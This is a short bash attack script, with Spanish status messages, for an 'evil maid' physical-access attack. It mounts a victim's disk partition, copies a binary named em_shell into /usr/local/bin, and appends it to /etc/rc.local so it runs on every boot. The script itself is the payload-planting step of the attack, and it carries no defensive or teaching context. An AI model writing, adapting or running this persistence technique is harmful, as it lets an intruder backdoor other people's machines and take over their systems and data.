#!/bin/bash
# inject_evil_maid.sh

echo "--- Evil Maid: Injection Phase ---"

TARGET_PARTITION="/dev/sda1"
MOUNT_POINT="/mnt/victim_boot"

mkdir -p $MOUNT_POINT

mount $TARGET_PARTITION $MOUNT_POINT

if [ $? -eq 0 ]; then
    echo "[+] Partición de arranque montada con éxito."
    
    cp ./em_shell $MOUNT_POINT/usr/local/bin/em_shell
    chmod +x $MOUNT_POINT/usr/local/bin/em_shell

    echo "/usr/local/bin/em_shell &" >> $MOUNT_POINT/etc/rc.local
    
    echo "[+] Inyección completada. El EM Shell se ejecutará al bootear."
    
    umount $MOUNT_POINT
else
    echo "[!] Error: No se pudo acceder a la partición."
fi
